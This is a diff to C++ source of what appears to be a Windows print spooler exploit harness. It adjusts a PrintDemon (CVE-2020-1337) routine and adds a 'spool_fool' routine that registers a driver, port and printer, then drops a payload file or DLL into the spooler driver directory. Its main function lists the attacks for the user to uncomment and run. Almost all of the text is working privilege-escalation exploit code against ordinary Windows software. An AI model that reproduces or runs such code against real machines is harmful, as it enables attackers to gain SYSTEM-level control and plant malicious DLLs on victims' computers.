@@ -14,7 +14,7 @@ struct PrinterExploitInfo {
 void cve_2020_1337_init(bool isRestarted) {
 	PrinterExploitInfo printDemonInfo(
 		const_cast<wchar_t*>(L"Generic / Text Only"),
-		const_cast<wchar_t*>(L"C:\\Windows\\System32\\malicious.txt"),
+		const_cast<wchar_t*>(L"C:\\Users\\User\\Desktop\\tmp"),
 		const_cast<wchar_t*>(L"print_demon"));
 
 	if (!isRestarted) {
@@ -77,20 +77,43 @@ void cve_2020_1030_init(bool isRestarted) {
 		HANDLE hPrinter = AddPrinter(cve_2020_1030Info.printerName, cve_2020_1030Info.driverName, cve_2020_1030Info.portName);
 		ClosePrinter(hPrinter);
 	}
+
+	// need to create this file on the desktop containing the payload 
 	wchar_t* filePath = const_cast<wchar_t*>(L"C:\\Users\\User\\Desktop\\payload.txt"); // can also be .dll 
 	// std::string fileName = "cve_2020_1030.txt"; // file to insert inside C:\Windows\System32\spool\drivers\x64\4
 	cve_2020_1030(cve_2020_1030Info.printerName, filePath, isRestarted);
+}
+
+void spool_fool_init(bool isRestarted) {
+	PrinterExploitInfo spool_fool_info(
+		const_cast<wchar_t*>(L"Microsoft Print To PDF"),
+		const_cast<wchar_t*>(L"PORTPROMPT:"),
+		const_cast<wchar_t*>(L"spool_fool_printer"));
+
+	if (!isRestarted) {
+		HRESULT driverResult = AddDriver(spool_fool_info.driverName);
+		DWORD portResult = AddPort(spool_fool_info.portName);
+		HANDLE hPrinter = AddPrinter(spool_fool_info.printerName, spool_fool_info.driverName, spool_fool_info.portName);
+		ClosePrinter(hPrinter);
+	}
+
+	// need to create this file on the desktop containing the payload 
+	wchar_t* filePath = const_cast<wchar_t*>(L"C:\\Users\\User\\Desktop\\payload.txt"); // can also be .dll 
+	// std::string fileName = "cve_2020_1030.txt"; // file to insert inside C:\Windows\System32\spool\drivers\x64\4
+	spool_fool(spool_fool_info.printerName, filePath, isRestarted);
 }
 
 int main(int argc, wchar_t* argv[]) {
 
 	bool isRestarted = isAppStartedFromReboot(argc, argv);
 		
+	// uncomment the attack that you want to execute 
+
 	// print_demon_init(isRestarted); 
 	// cve_2020_1337_init(isRestarted); 
 	
 	// cve_2020_1030_init(isRestarted); 
-
+	// spool_fool_init(isRestarted); 
 
 	system("pause"); 
 	return 0; 
